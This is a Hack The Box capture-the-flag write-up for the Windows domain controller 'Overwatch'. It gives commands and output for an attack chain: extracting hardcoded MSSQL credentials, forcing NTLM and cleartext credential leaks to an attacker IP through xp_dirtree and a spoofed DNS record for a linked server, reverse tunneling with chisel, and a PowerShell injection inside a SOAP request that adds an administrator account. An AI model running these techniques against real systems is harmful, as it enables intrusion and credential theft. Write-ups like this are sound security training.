# HTB Write-Up: Overwatch

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Overwatch) |
| Difficulty | Medium |
| OS | Windows |
| Date | October 21, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — SMB software$ Share & MSSQL Credential Discovery](#enumeration-smb-software-share-mssql-credential-discovery)
3. [Credential Capture — NTLMv2 Relay via Linked Server DNS Spoofing](#credential-capture-ntlmv2-relay-via-linked-server-dns-spoofing)
4. [Shell Access — sqlmgmt via Evil-WinRM & User Flag](#shell-access-sqlmgmt-via-evil-winrm-user-flag)
5. [Privilege Escalation — SOAP Service Command Injection to SYSTEM](#privilege-escalation-soap-service-command-injection-to-system)

## Reconnaissance

A full TCP port scan was run directly with **Nmap**:

```bash
nmap -T4 10.129.244.81 -A -p-
```

**Notable Open Ports:**

| Port | Service | Details |
| --- | --- | --- |
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Domain: `overwatch.htb` |
| 389 / 3268 | LDAP | Active Directory |
| 445 | SMB | microsoft-ds |
| 3389 | RDP | Host `S200401.overwatch.htb` |
| 5985 | HTTP (WinRM) | Microsoft-HTTPAPI/2.0 |
| 6520 | unknown | — flagged for deeper enumeration |
| 9389 | mc-nmf | .NET Message Framing |

This is clearly a Domain Controller for **`overwatch.htb`**, hostname **S200401**. One port stood out as non-standard — **6520** — and was enumerated separately:

```bash
nmap -p 6520 10.129.244.81 -sC -sV
```

**Result:**

```
6520/tcp open  ms-sql-s  Microsoft SQL Server 2022 16.00.1000.00; RTM
```

Port 6520 is running **MSSQL** on a non-default port — the next step was finding credentials for it.

## Enumeration — SMB software$ Share & MSSQL Credential Discovery

### 2.1 — Guest SMB Access

Null/guest SMB access was tested and worked:

```bash
netexec smb 10.129.244.81 -u "guest" -p "" --shares
```

**Output:**

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
software$       READ
SYSVOL                          Logon server share
```

The **`software$`** share stood out as non-default and readable.

### 2.2 — Pulling the Monitoring Application

```bash
smbclient //10.129.244.81/software$ -N
smb: \> recurse on
smb: \> ls
```

A `Monitoring` folder held a .NET application and its dependencies, including **`overwatch.exe`**, `overwatch.exe.config`, Entity Framework and SQLite DLLs. `overwatch.exe.config` was checked first but held no useful secrets.

### 2.3 — Decompiling with ILSpy

The binary itself was loaded into **ILSpy** to inspect its embedded strings:

```
Overwatch → Metadata → UserString Heap
```

A hardcoded database connection string was found directly in the heap:

```
Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;
```

This gave working MSSQL credentials: **`sqlsvc:TI0LKcfHzZw1Vv`**.

## Credential Capture — NTLMv2 Relay via Linked Server DNS Spoofing

### 3.1 — Connecting to MSSQL

```bash
impacket-mssqlclient -p 6520 sqlsvc@10.129.244.81 -windows-auth
```

Enumerating the available databases and tables turned up nothing sensitive directly.

### 3.2 — Capturing a Machine Account Hash

MSSQL's `xp_dirtree` can be abused to make the server reach out over SMB to an attacker-controlled path, leaking its NTLMv2 hash. A listener was started first:

```bash
sudo responder -I tun0
```

Then, from the SQL session:

```sql
EXEC master..xp_dirtree '\\10.10.14.25\share\';
```

Responder captured the **machine account** hash:

```
[SMB] NTLMv2-SSP Username : OVERWATCH\S200401$
[SMB] NTLMv2-SSP Hash     : S200401$::OVERWATCH:1f9bdadf0cb65d29:...
```

Machine account passwords are long, random, and effectively uncrackable with Hashcat against a wordlist — a different route to credentials was needed.

### 3.3 — Discovering a Dead Linked Server

MSSQL linked servers were enumerated:

```
enum_links
```

**Output:**

```
SRV_NAME             SRV_PRODUCT   SRV_DATASOURCE
-------------------   -----------   ------------------
S200401\SQLEXPRESS   SQL Server    S200401\SQLEXPRESS
SQL07                SQL Server    SQL07
```

Attempting to use `SQL07` failed to resolve:

```
use_link SQL07
```

```
ERROR(MSOLEDBSQL): Named Pipes Provider: Could not open a connection to SQL Server [53].
```

### 3.4 — Abusing DNS to Redirect the Linked Server

`SQL07` doesn't exist, but MSSQL still actively attempts to resolve and connect to it every time `use_link` is run. In Active Directory environments, authenticated users can often create their own DNS records by default. Since `sqlsvc` is a valid domain account, that behavior can be abused: create a DNS A record for `SQL07.overwatch.htb` pointing at the attacker's machine, so that the next connection attempt is redirected there — forcing the **SQL Server service account for SQL07** to authenticate to the attacker instead.

The record was created with **dnstool.py** from the **krbrelayx** toolkit:

```bash
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
python3 dnstool.py -u 'overwatch\sqlsvc' -p 'TI0LKcfHzZw1Vv' -r SQL07.overwatch.htb -a add -t A -d 10.10.14.25 10.129.244.81
```

```
[+] LDAP operation completed successfully
```

Responder was restarted in verbose mode to catch the result:

```bash
sudo responder -I tun0 -v
```

And the linked server was invoked again from the SQL session:

```
use_link SQL07
```

This time, the connection attempt landed on the attacker's listener — and because the real `SQL07` doesn't exist to answer, MSSQL fell back to sending the service account's credentials **in cleartext**:

```
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

## Shell Access — sqlmgmt via Evil-WinRM & User Flag

The recovered credentials were used directly:

```bash
evil-winrm -i 10.129.244.81 -u sqlmgmt -p bIhBbzMMnB82yx
```

The user flag was retrieved from the desktop:

```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type user.txt
e0d693cbc7acfd330629904df08fd118
```

## Privilege Escalation — SOAP Service Command Injection to SYSTEM

### 5.1 — Finding the Internal Service

`overwatch.exe.config`, read back during share enumeration, contained a service base address:

```
<add baseAddress="http://overwatch.htb:8000/MonitorService" />
```

This service was only bound locally on the target, so **chisel** was used to pivot the port out to Kali:

**On Kali:**

```bash
./chisel server -p 9090 --reverse
```

**On the target:**

```powershell
.\chisel.exe client 10.10.14.25:9090 R:8001:127.0.0.1:8000
```

With port 8000 forwarded to local port 8001, the service became reachable at `http://localhost:8001/MonitorService`.

### 5.2 — Inspecting the SOAP Service

The service exposed its WSDL (Web Services Description Language) description at `/MonitorService?singleWsdl`, listing three operations:

- `StartMonitoring`
- `StopMonitoring`
- `KillProcess`

Loading the application into **dotPeek** to inspect the decompiled source showed how `KillProcess` was implemented:

```csharp
public string KillProcess(string processName)
{
    string scriptContents = $"Stop-Process -Name {processName} -Force";
    using (Runspace runspace = RunspaceFactory.CreateRunspace())
    {
        runspace.Open();
        using (Pipeline pipeline = runspace.CreatePipeline())
        {
            pipeline.Commands.AddScript(scriptContents);
            ...
```

The `processName` parameter is concatenated directly into a PowerShell command string with no sanitization or escaping, so a `;` in the input lets additional PowerShell commands be injected. Since the service runs the resulting script through a PowerShell runspace as the service's own identity — **SYSTEM** — a successful injection means SYSTEM-level command execution.

### 5.3 — Crafting the SOAP Payload

SOAP services expect a specific XML envelope rather than a plain HTTP parameter, so the injection was wrapped in a SOAP request targeting `KillProcess`. The payload creates a new local user and adds it to the Administrators group:

```powershell
$payload = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcess xmlns="http://tempuri.org/"><processName>dummy; net user pwnadmin Pass@123! /add; net localgroup administrators pwnadmin /add #</processName></KillProcess></s:Body></s:Envelope>'

Invoke-WebRequest -Uri "http://localhost:8000/MonitorService" -Method POST -ContentType "text/xml; charset=utf-8" -Headers @{SOAPAction = "http://tempuri.org/IMonitoringService/KillProcess"} -Body $payload -UseBasicParsing
```

The user was confirmed created and added to the local Administrators group:

```powershell
*Evil-WinRM* PS C:\temp> net user pwnadmin
...
Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
```

### 5.4 — Root Flag

```bash
evil-winrm -i 10.129.244.81 -u pwnadmin -p Pass@123!
```

```powershell
*Evil-WinRM* PS C:\Users\pwnadmin\Documents> cd ..\..\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
bba75534b9b60c48b36e6ee1fd307f40
```
